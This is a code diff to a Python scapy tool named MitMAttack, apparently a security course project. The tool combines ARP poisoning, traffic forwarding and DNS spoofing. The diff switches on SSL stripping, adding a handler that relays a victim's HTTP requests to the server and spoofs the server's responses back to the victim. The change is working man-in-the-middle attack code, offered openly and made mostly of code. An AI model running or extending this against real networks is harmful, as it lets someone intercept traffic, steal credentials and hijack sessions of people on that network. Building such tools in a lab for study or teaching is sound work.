@@ -5,7 +5,7 @@ from subprocess import Popen, PIPE
 from scapy.arch import get_if_list, get_if_addr, get_if_hwaddr
 from scapy.config import conf
 from scapy.layers.dns import DNS, DNSRR, DNSQR
-from scapy.layers.http import HTTP
+from scapy.layers.http import HTTP, HTTPRequest
 from scapy.layers.inet import IP, UDP, TCP, TCP_client
 from scapy.layers.inet6 import IPv6
 from scapy.layers.l2 import ARP, getmacbyip, Ether
@@ -137,7 +137,10 @@ class MitMAttack:
         sendp(p, iface='enp0s3', verbose=False)
 
     def forwarding_filter(self, p):
-        return IP in p and p[IP].dst != self.host_ip and p[Ether].dst == self.host_mac
+        # packets directed towards us but not meant for use due to arp poisoning
+        # excluding packets for ssl stripping targets as they ar cached differently
+        return IP in p and p[IP].dst != self.host_ip and p[Ether].dst == self.host_mac \
+               and p[IP].src not in self.ssl_strip_targets
 
     def start_request_forwarding(self):
         """
@@ -166,6 +169,7 @@ class MitMAttack:
         return forward_request
 
     def dns_filter(self, pkt):
+        # received dns packets from our targets
         return IP in pkt and pkt.haslayer(DNS) and (pkt[IP].src in self.dns_spoofing_targets)
 
     def dns_sniffer(self):
@@ -237,8 +241,8 @@ class MitMAttack:
         Setup ssl striping attack
         :return:
         """
-        # t = AsyncSniffer(lfilter=self.filter_ssl_stripping, prn=self.get_ssl_stripper(), iface=self.network_interface)
-        # t.start()
+        t = AsyncSniffer(lfilter=self.filter_ssl_stripping, prn=self.get_ssl_stripper(), iface=self.network_interface)
+        t.start()
 
     def get_ssl_stripper(self):
         def ssl_stripper(p):
@@ -247,9 +251,18 @@ class MitMAttack:
             :param p: packet
             :return:
             """
+            # make connection with the server
             a = TCP_client.tcplink(HTTP, p[TCP].dst, p[TCP].dport)
-            a.send("")
-            a.recv()
+
+            # send the request to the server
+            request = HTTP()/p[HTTPRequest]
+            response = a.sr1(request)
+
+            # send the response back, from the original message
+            response[IP].dst = p[IP].src
+            response[TCP].dport = p[IP].sport
+
+            send(response)
 
         return ssl_stripper
 
@@ -312,6 +325,6 @@ if __name__ == '__main__':
             args.dns_spoof is None and args.dns_query is None and args.dns_ip is None):
         parser.error('Not all arguments for dns spoofing are filled in, please fill in dns_spoof,'
                      ' dns_query and dns_ip for dns spoofing')
-    print(args)
+    # print(args)
 
     MitMAttack(args)
